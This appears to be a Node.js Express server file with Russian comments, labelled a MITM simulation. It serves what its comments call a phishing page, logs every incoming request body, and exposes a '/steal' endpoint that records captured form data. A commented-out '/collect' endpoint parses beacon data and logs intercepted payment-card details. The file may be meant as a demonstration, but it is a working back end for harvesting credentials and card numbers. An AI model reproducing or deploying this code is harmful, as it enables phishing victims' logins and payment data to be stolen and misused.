import express from "express";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 8080;

// логируем все запросы (симуляция MITM)
app.use(express.json());
app.use((req, res, next) => {
    console.log(`[MITM] ${req.method} ${req.url}`, req.body || "");
    next();
});

// раздаём фишинговую страницу
app.use(express.static(path.join(__dirname, "public")));

// пример перехвата данных формы
app.post("/steal", (req, res) => {
    console.log("🔥 Перехваченные данные формы:", req.body);
    res.send({ status: "ok" });
});

// app.post("/collect", express.raw({ type: '*/*' }), (req, res) => {
//     try {
//         const data = JSON.parse(req.body.toString());
//         console.log("📊 Собранная аналитика (с перехватом):", data);
//         if (data.payment_attempt) {
//             console.log("🔥🔥🔥 ПЕРЕХВАЧЕНЫ ДАННЫЕ КАРТЫ:", data.payment_attempt);
//         }
//         res.status(204).end(); // No Content — типично для beacon
//     } catch (e) {
//         console.log("Ошибка парсинга:", e.message);
//         res.status(400).end();
//     }
// });

app.listen(PORT, () => {
    console.log(`MITM-сервер запущен → http://localhost:${PORT}`);
});